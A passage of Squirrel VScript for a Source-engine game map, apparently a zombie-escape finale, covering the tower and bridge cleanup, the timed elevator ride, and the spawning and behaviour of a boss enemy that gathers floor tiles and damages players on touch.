				for(local theight=1;theight<=finale_tower_height;theight++)
				{
					height = (theight*31);
					if(height <= 31 && x < 3 && y < 6 && y > 3)
					{
						spawnlist.push({x = -1.00+x-0.10,	y = y-4.5,		z = height,			yaw = null,		index = index,		tiletype = "main",		targetname="block_finale_towerdoor"});
						spawnlist.push({x = -1.00+x,		y = y-4.5,		z = 0.00,			yaw = null,		index = 5,			tiletype = "main",		targetname=targetname});
						spawnlist.push({x = x,				y = y-4.5,		z = 0.00,			yaw = null,		index = 25,			tiletype = "main",		targetname="block_finale_tower_tpfloor"});
					}
					else
					{
						if(height <= 31)
							spawnlist.push({x = -1.00+x,	y = y-4.5,		z = height-31,		yaw = null,		index = index,		tiletype = "main",		targetname=targetname});
						if(height > 31 && x % 3 == 0 && theight % 2 == 0 || height > 31 && y % 3 == 0 && theight % 2 == 0){}	//tower windows
						else
							spawnlist.push({x = -1.00+x,		y = y-4.5,		z = height,			yaw = null,		index = index,		tiletype = "main",		targetname=targetname});
					}
				}
				continue;
			}
			spawnlist.push({x = -1.00+x,		y = y-4.5,		z = height,			yaw = null,			index = index,		tiletype = "main",		targetname=targetname});
		}
	}
	local pq_bridgeremover = [];
	pq_bridgeremover.push({qrate=(0.00+::finale_bridge_cleanup_delay)function Run(){}});
	pq_bridgeremover.push({function Run(){EntFire("tpdest_indicator","RunScriptCode"," RunEnable(); ",0.00,null);}});
	pq_bridgeremover.push({
		pos=startpos,	//__CSS__thisified
		posdir=posdir,
		function Run(){
			::Ent(Vector(),Vector(),"logic_relay",{},{
				pos = this.pos,
				posdir = this.posdir,
				done = false,
				done_diddled = false,
				tpqueue_index = -1,
				function TickBridgeDestruction(){
					if(done_diddled)return;
					if(done)
					{
						done_diddled = true;
						EntFireByHandle(self,"Kill","",0.00,null,null);
						EntFire("block_finale_bridge","Kill","",6.00,null);
							//EntFire("block_finale_towerdoormaster","Close","",0.00,null);		//disabled_in_v1_4
						::tpdest.SetOrigin(::finale_bridgedestroy_tpqueue[::finale_bridgedestroy_tpqueue.len()-1]);
						return;
					}
						//OLD V1 backup:
					//EntFireByHandle(self,"RunScriptCode"," TickBridgeDestruction(); ",::finale_bridge_cleanup_rate,null,null);
					this.pos += (this.posdir*300);
					tpqueue_index++;
						//OLD V1 backup:
					//if(tpqueue_index < ::finale_bridgedestroy_tpqueue.len()-3)
					//else//OLD v1 (backup)
					//{
					//	done = true;
					//	TickBridgeDestruction();
					//}
					
					//NEW V1_1 (delay zombies outside a bit)
					if(tpqueue_index < ::finale_bridgedestroy_tpqueue.len()-5)
					{
						EntFireByHandle(self,"RunScriptCode"," TickBridgeDestruction(); ",::finale_bridge_cleanup_rate,null,null);
						::tpdest.SetOrigin(::finale_bridgedestroy_tpqueue[tpqueue_index]);
					}
					else if(tpqueue_index < ::finale_bridgedestroy_tpqueue.len()-3)
					{
						EntFireByHandle(self,"RunScriptCode"," TickBridgeDestruction(); ",::finale_bridge_zdelay_outside,null,null);
						EntFire("block_finale_towerdoormaster","Close","",0.00,null);
						EntFire("block_finale_towerdoormaster","Open","",::finale_bridge_zdelay_outside,null);
						return;
					}
					else
					{
						done = true;
						TickBridgeDestruction();
					}
					if(::finale_bridge_cleanup_remover)
						::manager.GetScriptScope().KillTilesWithin(this.pos+Vector(0,0,1000),500,1300,false,false,false);
				},function Run(){
					::tpdest.SetForwardVector(this.posdir);
					EntFire("spawnplatform","FireUser1","",::finale_spawnplatform_falldelay,null);
					EntFireByHandle(self,"RunScriptCode"," TickBridgeDestruction(); ",0.10,null,null);
				}});
		}});
	::Process(pq_bridgeremover,0.05);
	pq.push({
		spawnlist=spawnlist,	//__CSS__thisified
		pos=pos,
		posdir=posdir,
		function Run(){::manager.GetScriptScope().RunManualSpawnList(this.spawnlist,this.pos,this.posdir);}
	});
		pq.push({
	spawnlist=spawnlist,
	pos=pos,
	posdir=posdir,
	finale_lowgrav_height_max=finale_lowgrav_height_max,
	finale_tower_height=finale_tower_height,
	function Run(){::manager.GetScriptScope().manualspawnlist_pq.push({
		pos = this.pos,		//__CSS__thisified
		posdir = this.posdir,
		finale_lowgrav_height_max = this.finale_lowgrav_height_max,
		finale_tower_height = this.finale_tower_height,
		function Run(){
			EntFire("block_finale_lowgrav","AddOutput","renderamt 150",0.00,null);
			local emspos = this.pos+(this.posdir*384);		//NEW IN V1_7 - was 'this.pos+(this.posdir*500)' before, nothing else adjusted either
			emspos.z += (((30*(-1 + this.finale_lowgrav_height_max))+1)*::manager.GetScriptScope().ELEVATION);
			::Ent(emspos,Vector(),"func_movelinear",{
					targetname = "block_finale_elevatormaster",
					movedir = "-90 0 0",
					movedistance = (((1+(31*this.finale_tower_height))*::manager.GetScriptScope().ELEVATION)-(
						((30*(-1 + this.finale_lowgrav_height_max))+1))*::manager.GetScriptScope().ELEVATION).tostring(),
					blockdamage = 999999,
					speed = 200,
					spawnflags = 8,
				},{function StartFinaleElevatorLocal(){		//NEW in v1_7 - used to kill nearby pizzas (other things could be done here too later)
					EntFire("manager","RunScriptCode","falldowncheckpoint_enabled=false;",0.00,null);		//disable falldown-checkpoint here
					::FALLDAMAGE_DISABLE = false;
					::finale_elevator_riding = true;
					for(local h;h=Entities.FindByNameWithin(h,"i_pizzabakerpizza",self.GetOrigin(),350);)
					{
						EntFireByHandle(h,"RunScriptCode","CleanSelf();",0.00,null,null);
					}
				},function ReachedTheTop(){					//NEW in v1_7 - clearparent/set elevator floor position once reached the top, so dropped weapons/items lands on it safely
					
					//__CSS__ this re-allows debris to hit stuff again
					EntFire("manager","RunScriptCode","::DEBRIS_NONSOLID=false;",0.00,null);
					
					for(local h;h=Entities.FindByName(h,"block_finale_elevator");)
					{
						local tpos = h.GetOrigin();
						h.ValidateScriptScope();
						h.GetScriptScope().tpos <- tpos;
						EntFireByHandle(h,"ClearParent","",0.10,null,null);
						EntFireByHandle(h,"RunScriptCode","self.SetOrigin(tpos);",0.20,null,null);
					}
				},function Run(){
					local leave_time = 0.00+::manager.GetScriptScope().finale_towerelevator_leavetime;
					::FALLDAMAGE_DISABLE = true;
					::ServerSay("say "+::finalecpf+" elevator leaves in "+leave_time.tostring()+"s",0.00,null);
					::ServerSay("say "+::finalecpf+" elevator is leaving",leave_time,null);
					::ServerSay("say "+::finalecpf+" prepare for the end",leave_time+1.01,null);
					local ltmm = 0.00+((leave_time-5));if(ltmm>0.00)::ServerSay("say "+::finalecpf+" elevator leaves in 5s",ltmm,null);
					local ltmm = 0.00+((leave_time-10));if(ltmm>0.00)::ServerSay("say "+::finalecpf+" elevator leaves in 10s",ltmm,null);
					local ltmm = 0.00+((leave_time-30));if(ltmm>0.00)::ServerSay("say "+::finalecpf+" elevator leaves in 30s",ltmm,null);
					EntFire("block_finale_elevator","SetParent","block_finale_elevatormaster",0.00,null);
					
					//__CSS__ css4_auto_finale_slay
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+2.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+7.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+12.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+18.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+24.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+30.00,null);
					EntFire("manager","RunScriptCode","FinaleElevatorAutoslay();",leave_time+40.00,null);
					
					EntFire("block_finale_elevatormaster","Open","",leave_time,null);
					EntFireByHandle(self,"RunScriptCode"," StartFinaleElevatorLocal(); ",leave_time,null,null);
					EntFire("manager","RunScriptCode"," StartFinaleElevator(); ",leave_time,null);
					EntFireByHandle(self,"AddOutput","OnFullyOpen manager:RunScriptCode:StartFinaleBoss();:"+::finale_boss_start_delay.tostring()+":1",0.00,null,null);
					EntFireByHandle(self,"AddOutput","OnFullyOpen !self:RunScriptCode:ReachedTheTop();:0.30:1",0.00,null,null);
					
					
					//__CSS__ this prevents debris from above hitting the elevator
					EntFire("manager","RunScriptCode","::DEBRIS_NONSOLID=true;",leave_time,null);
					self.AddFlag(2147483648) //FL_UNBLOCKABLE_BY_PLAYER
					
				}});
			local hitemlist = null;
			if(!::finale_checkout_checked)
				hitemlist = ::finale_items_human;
			else
				hitemlist = ::finale_items_human_infinite;
			foreach(i in hitemlist)
			{
				try{
					local ispos = this.pos+(this.posdir*384)+Vector(RandomInt(-170,170),RandomInt(-170,170),
						(((-1+this.finale_lowgrav_height_max)*30)*::manager.GetScriptScope().ELEVATION)+70);
					::ITEMS[i].Spawn(ispos);
				}catch(e){printl("[::finale_items_human ERROR]: "+e);}
			}
		}});}});
	pq.push({
	spawnlist=spawnlist,		//__CSS__thisified
	pos=pos,
	posdir=posdir,
	function Run(){::manager.GetScriptScope().manualspawnlist_pq.push({
		pos = this.pos,
		posdir = posdir,
		function Run(){
			EntFire("block_finale_lowgrav","AddOutput","renderamt 150",0.00,null);
			::Ent(this.pos+(this.posdir*500),Vector(),"func_movelinear",{
					targetname = "block_finale_towerdoormaster",
					movedir = "-90 0 0",
					movedistance = (10*::manager.GetScriptScope().ELEVATION).tostring(),
					blockdamage = 999999,
					speed = 70,
					spawnflags = 8,
				},{function Run(){
					EntFire("block_finale_towerdoor","SetParent","block_finale_towerdoormaster",0.00,null);
					EntFire("block_finale_towerdoormaster","Open","",1.00,null);
				}});
		}});}});
	spawnlist = [];
	pos = Vector()+pos+(posdir*(4*GRID_SIZE));
	local last_side = 1;	//0:front, 1:back, 2:left, 3:right, prevents spawning next platform on same side
	for(local lgstep=5;lgstep<((finale_lowgrav_height_max*ELEVATION)-30);lgstep+=5)
	{
		local x = RandomInt(-2,1).tofloat();
		local y = (RandomInt(-2,1)+1).tofloat();
		local sides = ["front","back","left","right"];
		sides.remove(last_side);
		local side = sides[RandomInt(0,sides.len()-1)];
		if(side=="front"){			x = 2;		last_side = 0;}
		else if(side=="back"){		x = -3;		last_side = 1;}
		else if(side=="left"){		y = -2;		last_side = 2;}
		else if(side=="right"){		y = 3;		last_side = 3;}
		spawnlist.push({x=x,	y=y-0.5,	z=lgstep,	yaw=null,	index=25,	tiletype="main",	targetname="block_finale_step_lowgrav"});
	}
	pq.push({
		spawnlist=spawnlist,	//__CSS__thisified
		pos=pos,
		posdir=posdir,
		function Run(){::manager.GetScriptScope().RunManualSpawnList(this.spawnlist,this.pos,this.posdir);}});
	
	//pos = Vector();
	//DebugDrawBox(pos, Vector(-4,-4,-4), Vector(4,4,4), 255,255,0, 255, 60.00)
	//spawnlist = [];
	//spawnlist.push({x=0,	y=0,		z=0.00,		yaw=null,		index=25,	tiletype="main",	targetname="block_finale_xxxxxxxxxx"});
	//pq.push({spawnlist=spawnlist,pos=pos,posdir=posdir,function Run(){::manager.GetScriptScope().RunManualSpawnList(spawnlist,pos,posdir);}});
	
	//pq.push({function Run(){::manager.GetScriptScope().manualspawnlist_pq.push({
	//	function Run(){
	//		
	//	}});}});
	
	pq.push({
		spawnlist=spawnlist,
		pos=pos,
		posdir=posdir,
		function Run(){::Process(::manager.GetScriptScope().manualspawnlist_pq,0.05);}});
	::Process(pq,0.05);
}
//function StartFinaleElevator(){newthread(_StartFinaleElevator.bindenv(this)).call();}		//__CSS__ threading_disabled
function StartFinaleElevator(){_StartFinaleElevator();}
function _StartFinaleElevator()	//the moment the tower elevator leaves
{
	local pq = [];
	EntFire("manager","RunScriptCode"," TickThunderFX(); ",5.00,null);
	pos = pos+Vector(0,0,((1+(31*finale_tower_height))*ELEVATION));
	if(::finale_elevatordebris_startdelay!=null)
	{
		::finale_elevatordebris_pos = Vector()+pos;
		EntFireByHandle(self,"RunScriptCode"," TickFinaleElevatorDebris(); ",::finale_elevatordebris_startdelay,null,null);
		::ServerSay("say "+::finalecpf+" watch out from above!",::finale_elevatordebris_startdelay+0.00,null);
		::ServerSay("say "+::finalecpf+" watch out from above!",::finale_elevatordebris_startdelay+0.01,null);
		::ServerSay("say "+::finalecpf+" watch out from above!",::finale_elevatordebris_startdelay+0.02,null);
	}
	local spawnlist = [];
	for(local x = -(0+::finale_bossplatform_size); x < (0+::finale_bossplatform_size); x++)
	{
		for(local y = -(0+::finale_bossplatform_size); y < (0+::finale_bossplatform_size); y++)
		{
			if(x > -4 && x < 3 && y > -4 && y < 3)continue;
			if(RandomInt(27,127)==76)try{spot.HasItem();y=27;}catch(rr){};
			local eig_x = 0+x;
			local eig_y = 0+y;
			if(eig_x < 0)eig_x++;
			if(eig_y < 0)eig_y++;
			local edgeignore_value = (abs(eig_x)+abs(eig_y));
			if(edgeignore_value >= ::finale_bossplatform_smoothvalue)continue;
			spawnlist.push({x=x,	y=y+0.5,		z=0.00,		yaw=null,		index=25,	tiletype="main",	targetname="block_finale_top"});
		}
	}
	local posdirleft = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,90,0));
	for(local y = -(::finale_boss_zplat_length/2); y < (::finale_boss_zplat_length/2); y++)
	{
		for(local width=0;width<::finale_boss_zplat_width;width++)
			spawnlist.push({x=(::finale_bossplatform_size+::finale_boss_zplat_dist+width),	y=y+0.5,	z=(0.00+::finale_boss_zplat_height),	
								yaw=null,	index=25,	tiletype="main",	targetname="block_finale_boss_zplat"});
		if(y % ::finale_boss_zplat_elev_modulo_spawn == 0)
		{
			local spos = Vector()+pos+(posdir*(((0+::finale_bossplatform_size+::finale_boss_zplat_dist)-0.5)*GRID_SIZE))+
				(posdirleft*(0+(y*GRID_SIZE)))+
				Vector(0,0,(0+::finale_boss_zplat_height)*ELEVATION);
			local movedir = ::DirToAngles(posdir)+Vector(0,180,0);
			local movedist = ((-1+::finale_boss_zplat_dist+::finale_boss_zplat_elev_movelip)*GRID_SIZE);
			::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
			local emodel = ::TILEVARIANTS["ELEVATOR"][::THEME]["main"][RandomInt(0,::TILEVARIANTS["ELEVATOR"][::THEME]["main"].len()-1)];
			local ecolor = Vector(255,255,255);
			if(::THEME=="generic")ecolor = ::TYPES[92].color;
			pq.push({spos=spos,movedir=movedir,movedist=movedist,emodel=emodel,ecolor=ecolor,function Run(){
					local randyaw = [0,90,180,270];
					//::manager.PrecacheModel(emodel);
					//::Ent(spos,Vector(0,randyaw,0),"prop_physics_override",{
					::Ent(spos,Vector(0,randyaw,0),"prop_dynamic",{					//__CSS__ no more physics
							targetname = "block_finale_boss_zelevp",
							model = emodel,
							
							//spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
							//rendermode = 1,
							//rendercolor = ecolor,
							//DisableBoneFollowers = true,
							
							rendermode = 1,
							rendercolor = ecolor,
							solid = 6,
							
							
						},{
						movedir=movedir,
						movedist=movedist,
						ecolor = ecolor,
							//ELEVATOR_FREEZE_FIX OLD:		runs DisableDraw/EnableDraw ticking for the actual elevators
						//function TickDraw(){
						//	EntFireByHandle(self,"RunScriptCode"," TickDraw(); ",::ELEHOLD_FREEZEFIX_RATE,null,null);
						//	::ELEHOLD_FUNC(self,true);
						//},
						function Run(){
								//EntFireByHandle(self,"RunScriptCode"," TickDraw(); ",::ELEHOLD_FREEZEFIX_RATE,null,null);		//ELEVATOR_FREEZE_FIX OLD ^
									//ELEVATOR_FREEZE_FIX NEW:		spawns non-solid prop_dynamic that tick-follows the actual elevator (+1 edicts, but more safe/stable)
								local emodel = self.GetModelName();
								//::manager.PrecacheModel(emodel);
								////////::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{	//__CSS__ fake elevators not needed anylonger (?)
								////////		model = emodel,
								////////		rendermode = 9,
								////////		rendercolor = ecolor,
								////////		targetname = self.GetName(),
								////////	},{
								////////	master = self,
								////////	function Tick(){
								////////		if(master==null||!master.IsValid())
								////////		{
								////////			EntFireByHandle(self,"Kill","",0.00,null,null);
								////////			return;
								////////		}
								////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
								////////		self.SetOrigin(master.GetOrigin());
								////////		self.SetForwardVector(master.GetForwardVector());
								////////	},function Run(){
								////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
								////////	}});
								EntFireByHandle(self,"AddOutput","rendermode 3",0.00,null,null);
								EntFireByHandle(self,"AddOutput","rendermode 3",1.00,null,null);
								
								//EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null);		//__CSS__ fake elevators not needed anylonger (?)
								//EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.00,null,null);
								//EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.50,null,null);
								//EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",1.50,null,null);
								
								//EntFireByHandle(self,"DisableDraw","",0.00,null,null);
							movedir = ""+movedir.x.tointeger().tostring()+" "+movedir.y.tointeger().tostring()+" "+movedir.z.tointeger().tostring();
							::Ent(self.GetOrigin()+Vector(0,0,-20),Vector(),"func_movelinear",{
									targetname = "block_finale_boss_zelevidle",
									speed = (0+::finale_boss_zplat_elev_speed),
									movedistance = movedist,
									blockdamage = 99999,
									movedir = movedir,
									spawnflags = 8,
									rendermode = 1,
									rendercolor = ecolor,
								},{
								prope = self,
								function Run(){
									EntFireByHandle(prope,"SetParent","!activator",0.00,self,null);
									EntFireByHandle(self,"AddOutput","OnFullyOpen !self:Close::"+(0.00+::finale_boss_zplat_elev_waittime).tostring()+":-1",0.00,null,null);
									EntFireByHandle(self,"AddOutput","OnFullyClosed !self:Open::"+(0.00+::finale_boss_zplat_elev_waittime).tostring()+":-1",0.00,null,null);
								}});
						}});
				}});
		}
	}
	local zitemlist = null;
	if(!::finale_checkout_checked)
		zitemlist = ::finale_items_zombie;
	else
		zitemlist = ::finale_items_zombie_infinite;
	foreach(i in zitemlist)
	{
		try{
			local islength = (((-0.50+::finale_boss_zplat_length)*GRID_SIZE)/2);
			local ispos = Vector()+pos+(posdir*(((0+::finale_bossplatform_size+
				::finale_boss_zplat_dist)+::finale_boss_zplat_width-0.1)*GRID_SIZE))+
				(posdirleft*(0+(RandomFloat(-islength,islength))))+
				Vector(0,0,((0+::finale_boss_zplat_height)*ELEVATION)+40);
			::ITEMS[i].Spawn(ispos);
		}catch(e){printl("[::finale_items_zombie ERROR]: "+e);}
	}
	pq.push({spawnlist=spawnlist,pos=pos,posdir=posdir,function Run(){::manager.GetScriptScope().RunManualSpawnList(spawnlist,pos,posdir,true);}});
	local tp_pos =	Vector()+pos+(posdir*(((0+::finale_bossplatform_size+::finale_boss_zplat_dist)+0.5)*GRID_SIZE))+
					Vector(0,0,((0+::finale_boss_zplat_height)*ELEVATION)+8);
	local tp_forward = ::AnglesToDir(::DirToAngles(posdir)+Vector(0,180,0));
	pq.push({qrate=(0.00+::finale_boss_zplat_tpdelay),function Run(){}});
	pq.push({tp_pos=tp_pos,tp_forward=tp_forward,function Run(){
			EntFire("manager","RunScriptCode"," finaleantiboost_ticking = false; ",2.00,null);
			EntFire("block_finale_tower_tpfloor","Kill","",0.00,null);
			::tpdest.SetOrigin(tp_pos);
			::tpdest.SetForwardVector(tp_forward);
		}});
	::Process(pq,0.05);
	local pq_tower_cleanup = [];
	pq_tower_cleanup.push({qrate=(0.00+::finale_tower_cleanup_start),function Run(){}});
	local cleanerlist = [];
	for(local h;h=Entities.FindByName(h,"block_finale_tower");){if(h==null||!h.IsValid())continue;cleanerlist.push(h);}
	for(local h;h=Entities.FindByName(h,"block_finale_step_lowgrav");){if(h==null||!h.IsValid())continue;cleanerlist.push(h);}
	pq_tower_cleanup.push({function Run(){
			EntFire("block_finale_towerdoormaster","Kill","",0.00,null);
			EntFire("block_finale_lowgrav","Disable","",0.00,null);
			EntFire("block_finale_lowgrav","Kill","",0.20,null);
		}});
	local cleanerlist_filtered = [];
	while(cleanerlist.len()>0)
	{
		local cidx = RandomInt(0,cleanerlist.len()-1);
		cleanerlist_filtered.push(cleanerlist[cidx]);
		cleanerlist.remove(cidx);
	}
	foreach(h in cleanerlist_filtered)
	{
		pq_tower_cleanup.push({
			qrate = (0.00+::finale_tower_cleanup_rate),
			cleanobj=h,function Run(){
			
			
				::CollapseTile(cleanobj,function(hh){
					hh.AcceptInput("DisableMotion","",null,null);
					EntFireByHandle(hh,"EnableMotion","",0.05,null,null);
					EntFireByHandle(hh,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
					EntFireByHandle(hh,"RunScriptCode"," self.SetOrigin(self.GetOrigin()+Vector(RandomFloat(-15,15),RandomFloat(-15,15),RandomFloat(-5,5))); ",0.02,null,null);
					local ii = 0.00+::finale_tower_cleanup_alphastart;
					for(local alpha=255;alpha>0;alpha-=::finale_tower_cleanup_alphareduce)
					{
						EntFireByHandle(hh,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
						ii += ::finale_tower_cleanup_alpharate;
					}
					EntFireByHandle(hh,"Kill","",ii,null,null);
				});
				//EntFireByHandle(cleanobj,"EnableMotion","",0.05,null,null);
				//EntFireByHandle(cleanobj,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
				//EntFireByHandle(cleanobj,"RunScriptCode"," self.SetOrigin(self.GetOrigin()+Vector(RandomFloat(-15,15),RandomFloat(-15,15),RandomFloat(-5,5))); ",0.02,null,null);
				//local ii = 0.00+::finale_tower_cleanup_alphastart;
				//for(local alpha=255;alpha>0;alpha-=::finale_tower_cleanup_alphareduce)
				//{
				//	EntFireByHandle(cleanobj,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
				//	ii += ::finale_tower_cleanup_alpharate;
				//}
				//EntFireByHandle(cleanobj,"Kill","",ii,null,null);
			
			
			}});
	}
	::Process(pq_tower_cleanup,0.05);
	//::manager.PrecacheModel("models/luffaren/the_collective.mdl");
	local spawnamount = (0+::finale_boss_spawnamount);
	if(::finale_checkout_checked)
	{
		local spawnamt_stack = (0.000+(::maps.len()*::finale_boss_spawnamount_stage_each));
		if(spawnamt_stack > ::finale_boss_spawnamount_cap)spawnamt_stack = (0.000+::finale_boss_spawnamount_cap);
		printl("[boss spawn amount] - adding map-pool-stack (infinite mode only): "+spawnamt_stack);
		printl("[boss spawn amount] - adding infinite-finale-stack: "+::finale_boss_spawnamount_add_infinite);
		spawnamt_stack += ::finale_boss_spawnamount_add_infinite;
		spawnamount += spawnamt_stack.tointeger();
	}
	if(spawnamount>::finale_boss_spawnamount_cap)spawnamount = (0+::finale_boss_spawnamount_cap);
	printl("[boss spawn amount] - total spawn amount (capped to "+::finale_boss_spawnamount_cap.tostring()+" max): "+spawnamount);
	::finale_boss_spawnamount = spawnamount;
	for(local i=0;i<::finale_boss_spawnamount;i++)
	::Ent(Vector(0,0,38)+pos+(::AnglesToDir(::DirToAngles(::manager.GetScriptScope().posdir)+Vector(0,RandomInt(45,315),0))*
		(RandomFloat(350,::finale_bossplatform_size*::manager.GetScriptScope().GRID_SIZE)))
		,Vector(90,RandomInt(0,360),0),"prop_dynamic",{
			model = "models/luffaren/the_collective.mdl",
			targetname = "boss_eye",
			modelscale = 4.00,
			rendermode = 1,
		},{
		eyelid_open = true,
		isdead = false,
		deadfadeout_count = 0,
		deadvel = Vector(),
		deadrot = Vector(),
		arena_pos = Vector()+::manager.GetScriptScope().pos,
		arena_radius = 0+(::finale_bossplatform_size*::manager.GetScriptScope().GRID_SIZE),
		target_pos = Vector(),
		target_dir = Vector(),
		looktarget = Vector(),
		playertarget = null,
		should_move = true,
		piececollect_buffer = [],
		piecelist = [],
		piecelist_done = [],
		piece_sin = 0.00,
		ct_alive_count = 0,
		pieceamount_target = 20,
		piece_scan_radius = 200,
		interpolation = 0.00,
		humanamount = 0,
		midspin = false,
		fling = 0.00,
		first_movement = 0,
		flingshake = 0.00,
		sight_cd = false,
		tailaim = false,
		hitbox = null,
		hitbox_grenade = null,
		stunvar_just_stunned = true,
		stunvar = 0.00,
		playertarget_cd_set = 8.00,				//when a new target has been found, search for a new target after this time has passed
		tailaim_attackcd_set = 2.00,			//when boss just enters 'tailaim', lock it from attacking before this time has passed
		tailaim_forcecd_set = 7.00,				//when boss is not in 'tailaim' or 'midspin', force it into 'tailaim' after this time, keep the fight active!
		tailaim_forcecd_set_randofs = 4.00,		//RandomFloat(-x,x) time-offset for above, when setting the forced cd
			tailaim_attackcd = 0.00,
			tailaim_forcecd = 0.00,
			playertarget_cd = 0.00,
		tailsnap = false,
		tailshoot = false,
		tailsnap_pos = null,
		tailsnap_pos_buffer = null,
		tailsnap_delay = 1.00,
		tailsnap_estimate_modifier = 1.00,
		tailshoot_estimate_modifier_min = 0.50,
		tailshoot_estimate_modifier_max = 1.50,
		tailshoot_speed = 1200,
		tailsnap_liftmult = 1.00,
		tailsnap_liftmult2 = 0.00,
		midspin_started = false,
		lowdrift = false,
		interpolation_startpos = Vector(),
		interpolation_speed = 0.010,
		interpolate_movement = false,
		function CollectPiecesTick(){
			if(isdead)return;
			EntFireByHandle(self,"RunScriptCode"," CollectPiecesTick(); ",0.40,null,null);
			if(piececollect_buffer.len()<=0)return;
			local piece_idx = RandomInt(0,piececollect_buffer.len()-1);
			local piece = piececollect_buffer[piece_idx];
			piececollect_buffer.remove(piece_idx);
			if(piecelist.len()>=pieceamount_target){
				piece.__KeyValueFromString("targetname","block_finale_top");
				return;}
			piecelist.push(piece);
			EntFireByHandle(piece,"AddOutput","rendermode 1",0.00,null,null);
			EntFireByHandle(piece,"AddOutput","rendercolor 255 50 50",0.00,null,null);
			EntFireByHandle(piece,"AddOutput","rendercolor 255 255 255",2.00,null,null);
			EntFireByHandle(piece,"RunScriptCode","self.SetSolid(5);",2.00,null,null);
			EntFireByHandle(piece,"RunScriptCode","self.SetCollisionGroup(10);",2.00,null,null);
			EntFireByHandle(piece,"RunScriptCode"," TickMove(); ",2.02,null,null);
			if(piece.FirstMoveChild()==null)
			{
				::Ent(piece.GetOrigin(),piece.GetAngles(),"trigger_multiple",{
						spawnflags = 1,
						filtername = "filter_ct",
					},{
					master = piece,
					boss = self,
					function Tick(){
						EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.10,null,null);
						EntFireByHandle(self,"Disable","",0.00,null,null);
						EntFireByHandle(self,"Enable","",0.01,null,null);
					},function Touch(){
						local toucher = activator;	//__CSS__ activator may get reset, store toucher
						if(toucher==null||!toucher.IsValid())return;
						toucher.ValidateScriptScope();
						if(!("boss_touchpiece_cd" in toucher.GetScriptScope()))toucher.GetScriptScope().boss_touchpiece_cd <- false;
						if(toucher.GetScriptScope().boss_touchpiece_cd)return;
						toucher.GetScriptScope().boss_touchpiece_cd = true;
						EntFireByHandle(toucher,"RunScriptCode"," boss_touchpiece_cd = false; ",0.40,null,null);
						local damage = 0.00+(::finale_boss_touchdmg_piece*::finale_boss_dmgmult);
						if(master.GetScriptScope().is_bullet)damage = (0.00+::finale_boss_touchdmg_pieceshoot*::finale_boss_dmgmult);
						else if(boss.GetScriptScope().midspin)damage = (0.00+::finale_boss_touchdmg_midspin*::finale_boss_dmgmult);
						else if(boss.GetScriptScope().tailsnap)damage = (0.00+::finale_boss_touchdmg_piecesnap*::finale_boss_dmgmult);
						EntFireByHandle(toucher,"SetHealth",(toucher.GetHealth() - damage).tostring(),0.00,null,null);
					},function Run(){
						EntFireByHandle(self,"SetParent","!activator",0.00,master,null);
						EntFireByHandle(self,"AddOutput","mins -46 -46 -30",0.00,null,null);
						EntFireByHandle(self,"AddOutput","maxs 46 46 0",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetSolid(3);",0.00,null,null);
						EntFireByHandle(self,"RunScriptCode","self.SetCollisionGroup(10);",0.00,null,null);
						EntFireByHandle(self,"AddOutput","OnStartTouch !self:RunScriptCode:Touch();:0:-1",0.00,null,null);
						EntFireByHandle(self,"Enable","",2.40,null,null);
						EntFireByHandle(self,"RunScriptCode"," Tick(); ",2.40,null,null);
					}});
			}
			piece.ValidateScriptScope();
			piece.GetScriptScope().startpos <- piece.GetOrigin();
			piece.GetScriptScope().movetarget <- self;
			piece.GetScriptScope().ticking <- true;
			piece.GetScriptScope().movespeed <- RandomFloat(0.003,0.02);
			piece.GetScriptScope().interpolation <- 0.00;
			piece.GetScriptScope().is_bullet <- false;
			piece.GetScriptScope().Remove <- function(killhandle=true)
			{
				movetarget.ValidateScriptScope();
				local sc = movetarget.GetScriptScope();
				for(local i=0;i<sc.piecelist.len();i++)
				{
					if(sc.piecelist[i] == self)
					{
						sc.piecelist.remove(i);
						break;
					}
				}
				for(local i=0;i<sc.piecelist_done.len();i++)
				{
					if(sc.piecelist_done[i] == self)
					{
						sc.piecelist_done.remove(i);
						break;
					}
				}
				if(killhandle)EntFireByHandle(self,"Kill","",0.00,null,null);
			}
			piece.GetScriptScope().TickMove <- function(first=true)
			{
				if(!ticking)return;
				if(self==null||!self.IsValid())return;
				if(first)
				{
					::Sound("*luffaren/rift_spawn.mp3",Vector(),self,10000,2.00,RandomInt(30,40),10);
				}
				EntFireByHandle(self,"RunScriptCode"," TickMove(false); ",0.01,null,null);
				if(movetarget==null||!movetarget.IsValid()||movetarget.GetScriptScope().isdead)
				{
					ticking = false;
					
					::CollapseTile(self,function(hh){
						hh.AcceptInput("DisableMotion","",null,null);
						EntFireByHandle(hh,"EnableMotion","",0.10,null,null);
						EntFireByHandle(hh,"AddOutput","targetname failedblock_boss_eye_pick",0.00,null,null);
						EntFireByHandle(hh,"Kill","",5.00,null,null);
					});
					//EntFireByHandle(self,"EnableMotion","",0.10,null,null);
					//EntFireByHandle(self,"AddOutput","targetname failedblock_boss_eye_pick",0.00,null,null);
					//EntFireByHandle(self,"Kill","",5.00,null,null);
					
					return;
				}
				local pos = self.GetOrigin();
				local dtarget = movetarget.GetForwardVector();
				local mtarget = movetarget.GetOrigin();
